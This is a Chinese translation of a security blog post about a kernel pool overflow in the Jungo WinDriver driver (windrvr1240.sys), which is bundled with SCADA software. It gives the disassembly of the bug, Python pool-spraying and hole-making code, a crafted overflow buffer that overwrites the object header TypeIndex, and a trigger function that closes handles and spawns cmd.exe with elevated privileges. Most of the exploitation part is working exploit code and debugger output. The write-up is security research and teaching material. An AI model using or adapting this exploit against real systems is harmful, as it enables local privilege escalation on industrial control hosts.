> 原文链接: https://www.anquanke.com//post/id/86873 


# 【技术分享】瓮中之鳖：Windows内核池混合对象利用


                                阅读量   
                                **80962**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：srcincite.io
                                <br>原文地址：[http://srcincite.io/blog/2017/09/06/sharks-in-the-pool-mixed-object-exploitation-in-the-windows-kernel-pool.html](http://srcincite.io/blog/2017/09/06/sharks-in-the-pool-mixed-object-exploitation-in-the-windows-kernel-pool.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01d201e325d727d24d.jpg)](https://p1.ssl.qhimg.com/t01d201e325d727d24d.jpg)

译者：[eridanus96](http://bobao.360.cn/member/contribute?uid=2857535356)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**传送门**



[**【技术分享】Windows内核池喷射**](http://bobao.360.cn/learning/detail/3921.html)

[**【技术分享】HEVD内核漏洞训练——陪Windows玩儿**](http://bobao.360.cn/learning/detail/3544.html)



**前言**

****

本文主要探讨一个基本的内核池溢出漏洞，并研究在通过混合内核对象进行内核池喷射后，如何通过覆盖TypeIndex来进行渗透的方法。

此前，我参加了[AWE系列课程](http://www.fuzzysecurity.com/tutorials.html)，在课程结束后，我很想找到一些可以利用的内核漏洞。尽管我可以使用[HackSys Extreme Vulnerable Driver（HEVD）](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)这个非常棒的学习工具，但我认为，在实际应用中发现并利用漏洞，会让我更有成就感。

于是，我开始学习如何开发一个Windows内核设备驱动程序的fuzzer，并使用我自己的fuzzer去发现漏洞，这个漏洞就是我借助自己的fuzzer发现的。希望我的漏洞发现和利用过程能对大家有所帮助。

 

**漏洞分析**

****

在测试了一些SCADA（数据采集与监视控制系统）产品后，我发现了一个叫做“WinDriver”的第三方组件，它其实是[Jungo的DriverWizard WinDriver](http://www.jungo.com/st/products/windriver/)，该组件通常捆绑于几个SCADA应用程序之中，经常能在旧版本中发现它的踪迹。

在安装之后，它将一个名为**windrvr1240.sys**的设备驱动程序安装到Windows的驱动文件夹内。通过逆向，我找到了几个ioctl代码，可以直接插入到我fuzzer的配置文件中。



```
`{` 
    "ioctls_range":`{`
        "start": "0x95380000",
        "end": "0x9538ffff"
    `}`
`}`
```

然后，我通过使用**verifier/volatile/flags 0x1/adddriver windrvr1240.sys**，启用了一个特殊的池，并初步尝试运行了我的fuzzer。随后，成功发现了几个可以利用的漏洞，其中一个漏洞引起了我的注意：



```
kd&gt; .trap 0xffffffffc800f96c
ErrCode = 00000002
eax=e4e4e4e4 ebx=8df44ba8 ecx=8df45004 edx=805d2141 esi=f268d599 edi=00000088
eip=9ffbc9e5 esp=c800f9e0 ebp=c800f9ec iopl=0         nv up ei pl nz na pe cy
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010207
windrvr1240+0x199e5:
9ffbc9e5 8941fc          mov     dword ptr [ecx-4],eax ds:0023:8df45000=????????
 
kd&gt; dd esi+ecx-4
805d2599  e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4
805d25a9  e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4
805d25b9  e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4
805d25c9  e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4
805d25d9  e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4
805d25e9  e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4
805d25f9  e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4
805d2609  e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4
```

这是存储在[esi + ecx]中的用户控制数据，而它会对超出内核池的部分进行写入，通过进一步的研究发现，这其实是由loc_4199D8中的内联赋值操作而导致的池溢出。



```
.text:0041998E sub_41998E      proc near                    ; CODE XREF: sub_419B7C+3B2
.text:0041998E
.text:0041998E arg_0           = dword ptr  8
.text:0041998E arg_4           = dword ptr  0Ch
.text:0041998E
.text:0041998E                 push    ebp
.text:0041998F                 mov     ebp, esp
.text:00419991                 push    ebx
.text:00419992                 mov     ebx, [ebp+arg_4]
.text:00419995                 push    esi
.text:00419996                 push    edi
.text:00419997                 push    458h                 ; fized size_t +0x8 == 0x460
.text:0041999C                 xor     edi, edi
.text:0041999E                 push    edi                  ; int
.text:0041999F                 push    ebx                  ; void *
.text:004199A0                 call    memset               ; memset our buffer before the overflow
.text:004199A5                 mov     edx, [ebp+arg_0]     ; this is the SystemBuffer
.text:004199A8                 add     esp, 0Ch
.text:004199AB                 mov     eax, [edx]
.text:004199AD                 mov     [ebx], eax
.text:004199AF                 mov     eax, [edx+4]
.text:004199B2                 mov     [ebx+4], eax
.text:004199B5                 mov     eax, [edx+8]
.text:004199B8                 mov     [ebx+8], eax
.text:004199BB                 mov     eax, [edx+10h]
.text:004199BE                 mov     [ebx+10h], eax
.text:004199C1                 mov     eax, [edx+14h]
.text:004199C4                 mov     [ebx+14h], eax
.text:004199C7                 mov     eax, [edx+18h]       ; read our controlled size from SystemBuffer
.text:004199CA                 mov     [ebx+18h], eax       ; store it in the new kernel buffer
.text:004199CD                 test    eax, eax
.text:004199CF                 jz      short loc_4199ED
.text:004199D1                 mov     esi, edx
.text:004199D3                 lea     ecx, [ebx+1Ch]       ; index offset for the first write
.text:004199D6                 sub     esi, ebx
.text:004199D8
.text:004199D8 loc_4199D8:                                  ; CODE XREF: sub_41998E+5D
.text:004199D8                 mov     eax, [esi+ecx]       ; load the first write value from the buffer
.text:004199DB                 inc     edi                  ; copy loop index
.text:004199DC                 mov     [ecx], eax           ; first dword write
.text:004199DE                 lea     ecx, [ecx+8]         ; set the index into our overflown buffer
.text:004199E1                 mov     eax, [esi+ecx-4]     ; load the second write value from the buffer
.text:004199E5                 mov     [ecx-4], eax         ; second dword write
.text:004199E8                 cmp     edi, [ebx+18h]       ; compare against our controlled size
.text:004199EB                 jb      short loc_4199D8     ; jump back into loop
```

负责复制的循环，实际上会为每次循环（qword）复制8个字节，并溢出大小为0x460（0x458 + 0x8字节头）的缓冲区。**复制的大小，直接是攻击者在输入缓冲区控制部分的大小**。不存在整数溢出，也并没有将其存储在不易被找到的地方。我们可以看到，0x004199E8的大小，就是相应缓冲区中，从+0x18偏移量控制部分的大小。这样一来，利用就变得尤为简单。

 

**漏洞利用**

****

我们可以借助TypeIndex对象覆盖的方式来进行这一漏洞的利用，具体来说是使用内核对象，覆盖存储在_OBJECT_HEADER中的TypeIndex。更详细的内容，可以参考文末我引用的文章。

以往我们使用的一些常用对象都是Event对象（大小为0x40）和IoCompletionReserve对象（大小为0x60），常用的利用方式是像这样：

1.     用大小为X的对象造成池喷射，填满内存页；

2.     通过立即释放内存（free）或减少对象的引用计数（release，不会立即释放）相邻的对象，以触发coalescing，从而达到目标区块要求的大小（在本例中是0x460）；

3.     分配和溢出缓冲区，这样有一定几率可以消除下一个对象的_OBJECT_HEADER，从而利用TypeIndex。

举例来说，如果溢出的缓冲区大小是0x200，就可以分配一组Event对象，并释放（free）其中的0x8（因为0x40 * 0x8 == 0x200），这样一来我们就可以在其中进行分配和溢出。所以，我们假设需要的内核对象，是池大小的n次幂。

但问题是，通过这种方式有时并不会有效，例如我们的池大小是0x460，如果我们这样的话：



```
&gt;&gt;&gt; 0x460 % 0x40
32
&gt;&gt;&gt; 0x460 % 0x60
64
&gt;&gt;&gt;
```

结果表明，总会有剩余的一部分空间，也就是说我们不能使其产生一个特定大小的区块。后来，我发现有一种方法可以解决该问题，我们可以搜索具有目标缓冲区大小的n次幂的内核对象，并使用这些找到的对象。经过搜寻，我发现了另外两个内核对象：



```
# 1
type = "Job"
size = 0x168
 
windll.kernel32.CreateJobObjectW(None, None)
 
# 2
type = "Timer"
size = 0xc8
 
windll.kernel32.CreateWaitableTimerW(None, 0, None)
```

然而，这些大小也同样不能使用，因为它们没有满足要求。经过一段时间的测试，我意识到，可以采用这样的方式：



```
&gt;&gt;&gt; 0x460 % 0xa0
0
&gt;&gt;&gt;
```

这样一来，0xa0就可以均匀地分成几个0x460，那么我们再将Event和IoCompletionReserve对象结合起来（0x40 + 0x60 = 0xa0），就能够实现！



**喷射过程**

****

```
def we_can_spray():
    """
    Spray the Kernel Pool with IoCompletionReserve and Event Objects.
    The IoCompletionReserve object is 0x60 and Event object is 0x40 bytes in length.
    These are allocated from the Nonpaged kernel pool.
    """
    handles = []
    IO_COMPLETION_OBJECT = 1
    for i in range(0, 25000):
        handles.append(windll.kernel32.CreateEventA(0,0,0,0))
        hHandle = HANDLE(0)
        handles.append(ntdll.NtAllocateReserveObject(byref(hHandle), 0x0, IO_COMPLETION_OBJECT))
 
    # could do with some better validation
    if len(handles) &gt; 0:
        return True
    return False
```

这个函数可以喷出50000个对象，其中包括25000个Event对象和25000个IoCompletionReserve对象。在WinDBG中，看起来非常炫酷：



```
kd&gt; !pool 85d1f000
Pool page 85d1f000 region is Nonpaged pool
*85d1f000 size:   60 previous size:    0  (Allocated) *IoCo (Protected)
        Owning component : Unknown (update pooltag.txt)
 85d1f060 size:   60 previous size:   60  (Allocated)  IoCo (Protected)       &lt;--- chunk first allocated in the page
 85d1f0c0 size:   40 previous size:   60  (Allocated)  Even (Protected)
 85d1f100 size:   60 previous size:   40  (Allocated)  IoCo (Protected)
 85d1f160 size:   40 previous size:   60  (Allocated)  Even (Protected)
......
 85d1ff60 size:   60 previous size:   40  (Allocated)  IoCo (Protected)
 85d1ffc0 size:   40 previous size:   60  (Allocated)  Even (Protected)
```



**构建洞**

****

“IoCo”标志代表IoCompletionReserve对象，“Even”标志代表Event对象。请注意，我们第一个区块的偏移量是0x60，这就是我们开始释放（free）的偏移量。如果我们释放一组IoCompletionReserve和Event对象，那么我们的计算结果便是：



```
&gt;&gt;&gt; "0x%x" % (0x7 * 0xa0)
'0x460'
&gt;&gt;&gt;
```

此时，会产生我们所希望的大小。让我们迅速来看看如果我们只释放接下来的7个IoCompletionReserve对象后会怎么样：



```
kd&gt; !pool 85d1f000
Pool page 85d1f000 region is Nonpaged pool
*85d1f000 size:   60 previous size:    0  (Allocated) *IoCo (Protected)
        Owning component : Unknown (update pooltag.txt)
 85d1f060 size:   60 previous size:   60  (Free)       IoCo
 85d1f0c0 size:   40 previous size:   60  (Allocated)  Even (Protected)
 85d1f100 size:   60 previous size:   40  (Free)       IoCo
 85d1f160 size:   40 previous size:   60  (Allocated)  Even (Protected)
......
 85d1f420 size:   60 previous size:   40  (Free)       IoCo
 85d1f480 size:   40 previous size:   60  (Allocated)  Even (Protected)
 85d1f4c0 size:   60 previous size:   40  (Allocated)  IoCo (Protected)
 85d1f520  size:      40  previous size:       60    (Allocated)    Even  (Protected)
......
 85d1ff60 size:   60 previous size:   40  (Allocated)  IoCo (Protected)
 85d1ffc0 size:   40 previous size:   60  (Allocated)  Even (Protected)
```

可以看出，我们已经拥有很多已被释放的块，但它们是各自独立的。但是，我们仍需要把它们合并成一个0x460的区块。我们首先将区块的偏移量设置为0x60（第一个指向0xXXXXY060）。



```
bin = []
 
            # object sizes
            CreateEvent_size         = 0x40
            IoCompletionReserve_size = 0x60
            combined_size            = CreateEvent_size + IoCompletionReserve_size
 
            # after the 0x20 chunk hole, the first object will be the IoCompletionReserve object
            offset = IoCompletionReserve_size  
            for i in range(offset, offset + (7 * combined_size), combined_size):
                try:
                    # chunks need to be next to each other for the coalesce to take effect
                    bin.append(khandlesd[obj + i])
                    bin.append(khandlesd[obj + i - IoCompletionReserve_size])
                except KeyError:
                    pass
 
            # make sure it's contiguously allocated memory
            if len(tuple(bin)) == 14:
                holes.append(tuple(bin))
 
    # make the holes to fill
    for hole in holes:
        for handle in hole:
            kernel32.CloseHandle(handle)
```

在我们释放函数的同时，在池中打洞，并获得我们所期待的释放块。



```
kd&gt; !pool 8674e000
Pool page 8674e000 region is Nonpaged pool
*8674e000 size:  460 previous size:    0  (Free)      *Io                       &lt;-- 0x460 chunk is free
    Pooltag Io   : general IO allocations, Binary : nt!io
 8674e460 size:   60 previous size:  460  (Allocated)  IoCo (Protected)
 8674e4c0 size:   40 previous size:   60  (Allocated)  Even (Protected)
......
 8674ef60 size:   40 previous size:   60  (Allocated)  Even (Protected)
 8674efa0 size:   60 previous size:   40  (Allocated)  IoCo (Protected)
```

在此时，释放的区块已经合并，并且拥有一个完美的大小，接下来就可以进行分配和覆盖。



**对已释放区块的分配和覆盖**

****

```
def we_can_trigger_the_pool_overflow():
    """
    This triggers the pool overflow vulnerability using a buffer of size 0x460.
    """
    GENERIC_READ  = 0x80000000
    GENERIC_WRITE = 0x40000000
    OPEN_EXISTING = 0x3
    DEVICE_NAME   = "\\.\WinDrvr1240"
    dwReturn      = c_ulong()
    driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
    inputbuffer       = 0x41414141
    inputbuffer_size  = 0x5000
    outputbuffer_size = 0x5000
    outputbuffer      = 0x20000000
    alloc_pool_overflow_buffer(inputbuffer, inputbuffer_size)
    IoStatusBlock = c_ulong()
 
    if driver_handle:
        dev_ioctl = ntdll.ZwDeviceIoControlFile(driver_handle, None, None, None, byref(IoStatusBlock), 0x953824b7,
                                                inputbuffer, inputbuffer_size, outputbuffer, outputbuffer_size)
        return True
    return False
```



**实现溢出**

****

大家可能注意到，在对缓冲区中偏移0x90的利用中，有一个空的dword。



```
def alloc_pool_overflow_buffer(base, input_size):
    """
    Craft our special buffer to trigger the overflow.
    """
    print "(+) allocating pool overflow input buffer"
    baseadd   = c_int(base)
    size = c_int(input_size)
    input  = "x41" * 0x18                     # offset to size
    input += struct.pack("&lt;I", 0x0000008d)     # controlled size (this triggers the overflow)
    input += "x42" * (0x90-len(input))        # padding to survive bsod
    input += struct.pack("&lt;I", 0x00000000)     # use a NULL dword for sub_4196CA
    input += "x43" * ((0x460-0x8)-len(input)) # fill our pool buffer
```

该溢出需要始终存在，并且不能再被处理。下列的代码可以在复制循环后直接执行：



```
.text:004199ED loc_4199ED:                                  ; CODE XREF: sub_41998E+41
.text:004199ED                 push    9
.text:004199EF                 pop     ecx
.text:004199F0                 lea     eax, [ebx+90h]       ; controlled from the copy
.text:004199F6                 push    eax                  ; void *
.text:004199F7                 lea     esi, [edx+6Ch]       ; controlled offset
.text:004199FA                 lea     eax, [edx+90h]       ; controlled offset
.text:00419A00                 lea     edi, [ebx+6Ch]       ; controlled from copy
.text:00419A03                 rep movsd
.text:00419A05                 push    eax                  ; int
.text:00419A06                 call    sub_4196CA           ; call sub_4196CA
```

值得注意的是，代码将会调用sub_4196CA。此外还要注意，@eax会成为我们的缓冲区+0x90（0x004199FA）。我们具体看一下这个函数调用：



```
.text:004196CA sub_4196CA      proc near                    ; CODE XREF: sub_4195A6+1E
.text:004196CA                                              ; sub_41998E+78 ...
.text:004196CA
.text:004196CA arg_0           = dword ptr  8
.text:004196CA arg_4           = dword ptr  0Ch
.text:004196CA
.text:004196CA                 push    ebp
.text:004196CB                 mov     ebp, esp
.text:004196CD                 push    ebx
.text:004196CE                 mov     ebx, [ebp+arg_4]
.text:004196D1                 push    edi
.text:004196D2                 push    3C8h                 ; size_t
.text:004196D7                 push    0                    ; int
.text:004196D9                 push    ebx                  ; void *
.text:004196DA                 call    memset
.text:004196DF                 mov     edi, [ebp+arg_0]     ; controlled buffer
.text:004196E2                 xor     edx, edx
.text:004196E4                 add     esp, 0Ch
.text:004196E7                 mov     [ebp+arg_4], edx
.text:004196EA                 mov     eax, [edi]           ; make sure @eax is null
.text:004196EC                 mov     [ebx], eax           ; the write here is fine
.text:004196EE                 test    eax, eax
.text:004196F0                 jz      loc_4197CB           ; take the jump
```

该代码，会从我们在+0x90的SystemBuffer中得到一个dword值，并将其写入溢出的缓冲区之中，并检查其是否为空。如果为空，我们就不在这个函数中对其继续做处理，并且返回。



```
.text:004197CB loc_4197CB:                                  ; CODE XREF: sub_4196CA+26
.text:004197CB                 pop     edi
.text:004197CC                 pop     ebx
.text:004197CD                 pop     ebp
.text:004197CE                 retn    8
```

如果不这么做，在试图访问缓冲区中不存在的指针时，很有可能会出现蓝屏。

至此，我们就可以毫无顾虑地触发eop了。关于Shellcode清理，我们溢出的缓冲区存储在@esi中，所以我们可以计算TypeIndex的偏移量，并对其进行修补。最后，建议将ObjectCreateInfo改为空，因为系统会避免使用这个指针。



**打造我们的缓冲区**

****

考虑到在每一次循环时，都会复制0x8字节，并且起始索引是0x1c：

```
.text:004199D3                 lea     ecx, [ebx+1Ch]       ; index offset for the first write
```

假设我们希望得到44字节（0x2c）的缓冲区溢出，我们用缓冲区的大小，减去头部，减去起始索引偏移量，加上想要溢出的字节数，最后将其除以0x8（这是因为每次循环都复制0x8字节）。

```
(0x460 – 0x8 – 0x1c + 0x2c) / 0x8 = 0x8d
```

也就是说，0x8d的大小会使缓冲区溢出0x2c（即44字节），并能损坏池的头部、引用和对象头。



```
# repair the allocated chunk header...
    input += struct.pack("&lt;I", 0x040c008c)     # _POOL_HEADER
    input += struct.pack("&lt;I", 0xef436f49)     # _POOL_HEADER (PoolTag)
    input += struct.pack("&lt;I", 0x00000000)     # _OBJECT_HEADER_QUOTA_INFO
    input += struct.pack("&lt;I", 0x0000005c)     # _OBJECT_HEADER_QUOTA_INFO
    input += struct.pack("&lt;I", 0x00000000)     # _OBJECT_HEADER_QUOTA_INFO
    input += struct.pack("&lt;I", 0x00000000)     # _OBJECT_HEADER_QUOTA_INFO
    input += struct.pack("&lt;I", 0x00000001)     # _OBJECT_HEADER (PointerCount)
    input += struct.pack("&lt;I", 0x00000001)     # _OBJECT_HEADER (HandleCount)
    input += struct.pack("&lt;I", 0x00000000)     # _OBJECT_HEADER (Lock)
    input += struct.pack("&lt;I", 0x00080000)     # _OBJECT_HEADER (TypeIndex)
    input += struct.pack("&lt;I", 0x00000000)     # _OBJECT_HEADER (ObjectCreateInfo)
```

当我们将到0x00080000（实际上是较小的一个值）的TypeIndex为null。这意味着，函数表会指向0x0，并且我们可以映射空页。



```
kd&gt; dd nt!ObTypeIndexTable L2
82b7dee0  00000000 bad0b0b0
```

请注意，这里的第二个索引是0xbad0b0b0。这样的方法同样可以用于x64系统。



**触发内核中的代码执行**

****

在触发了溢出后，它存活了下来。但为了获得eop，我们需要设置一个指向0x00000074的指针，以利用**OkayToCloseProcedure**函数指针。



```
kd&gt; dt nt!_OBJECT_TYPE name 84fc8040
   +0x008 Name : _UNICODE_STRING "IoCompletionReserve"
kd&gt; dt nt!_OBJECT_TYPE 84fc8040 .
   +0x000 TypeList         :  [ 0x84fc8040 - 0x84fc8040 ]
      +0x000 Flink            : 0x84fc8040 _LIST_ENTRY [ 0x84fc8040 - 0x84fc8040 ]
      +0x004 Blink            : 0x84fc8040 _LIST_ENTRY [ 0x84fc8040 - 0x84fc8040 ]
   +0x008 Name             :  "IoCompletionReserve"
      +0x000 Length           : 0x26
      +0x002 MaximumLength    : 0x28
      +0x004 Buffer           : 0x88c01090  "IoCompletionReserve"
   +0x010 DefaultObject    :
   +0x014 Index            : 0x0 ''                &lt;--- TypeIndex is 0x0
   +0x018 TotalNumberOfObjects : 0x61a9
   +0x01c TotalNumberOfHandles : 0x61a9
   +0x020 HighWaterNumberOfObjects : 0x61a9
   +0x024 HighWaterNumberOfHandles : 0x61a9
   +0x028 TypeInfo         :                       &lt;-- TypeInfo is offset 0x28 from 0x0
      +0x000 Length           : 0x50
      +0x002 ObjectTypeFlags  : 0x2 ''
      +0x002 CaseInsensitive  : 0y0
      +0x002 UnnamedObjectsOnly : 0y1
      +0x002 UseDefaultObject : 0y0
      +0x002 SecurityRequired : 0y0
      +0x002 MaintainHandleCount : 0y0
      +0x002 MaintainTypeList : 0y0
      +0x002 SupportsObjectCallbacks : 0y0
      +0x002 CacheAligned     : 0y0
      +0x004 ObjectTypeCode   : 0
      +0x008 InvalidAttributes : 0xb0
      +0x00c GenericMapping   : _GENERIC_MAPPING
      +0x01c ValidAccessMask  : 0xf0003
      +0x020 RetainAccess     : 0
      +0x024 PoolType         : 0 ( NonPagedPool )
      +0x028 DefaultPagedPoolCharge : 0
      +0x02c DefaultNonPagedPoolCharge : 0x5c
      +0x030 DumpProcedure    : (null)
      +0x034 OpenProcedure    : (null)
      +0x038 CloseProcedure   : (null)
      +0x03c DeleteProcedure  : (null)
      +0x040 ParseProcedure   : (null)
      +0x044 SecurityProcedure : 0x82cb02ac        long  nt!SeDefaultObjectMethod+0
      +0x048 QueryNameProcedure : (null)
      +0x04c OkayToCloseProcedure : (null)         &lt;--- OkayToCloseProcedure is offset 0x4c from 0x0
   +0x078 TypeLock         :
      +0x000 Locked           : 0y0
      +0x000 Waiting          : 0y0
      +0x000 Waking           : 0y0
      +0x000 MultipleShared   : 0y0
      +0x000 Shared           : 0y0000000000000000000000000000 (0)
      +0x000 Value            : 0
      +0x000 Ptr              : (null)
   +0x07c Key              : 0x6f436f49
   +0x080 CallbackList     :  [ 0x84fc80c0 - 0x84fc80c0 ]
      +0x000 Flink            : 0x84fc80c0 _LIST_ENTRY [ 0x84fc80c0 - 0x84fc80c0 ]
      +0x004 Blink            : 0x84fc80c0 _LIST_ENTRY [ 0x84fc80c0 - 0x84fc80c0 ]
```



这样，0x28 + 0x4c = 0x74便是我们的指针需要指向的位置。但是**OkayToCloseProcedure**是如何调用的呢？经过研究发现，这是一个注册的aexit handler。所以，为了触发代码的执行，我们只需要释放损坏的IoCompletionReserve。我们并不清楚句柄是与哪一个溢出块相关联，所以我们干脆全部释放它们。



```
def trigger_lpe():
    """
    This function frees the IoCompletionReserve objects and this triggers the
    registered aexit, which is our controlled pointer to OkayToCloseProcedure.
    """
    # free the corrupted chunk to trigger OkayToCloseProcedure
    for k, v in khandlesd.iteritems():
        kernel32.CloseHandle(v)
    os.system("cmd.exe")
```

最后，我们最终成功实现，如图所示：

[![](https://p3.ssl.qhimg.com/t0153a9cf9002a8449f.png)](https://p3.ssl.qhimg.com/t0153a9cf9002a8449f.png)



**参考文章**

****

[https://github.com/hacksysteam/HackSysExtremeVulnerableDriver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) 

[http://www.fuzzysecurity.com/tutorials/expDev/20.html](http://www.fuzzysecurity.com/tutorials/expDev/20.html) 

[https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-Slides.pdf](https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-Slides.pdf) 

[https://msdn.microsoft.com/en-us/library/windows/desktop/ms724485(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms724485(v=vs.85).aspx) 

[https://www.exploit-db.com/exploits/34272](https://www.exploit-db.com/exploits/34272) 
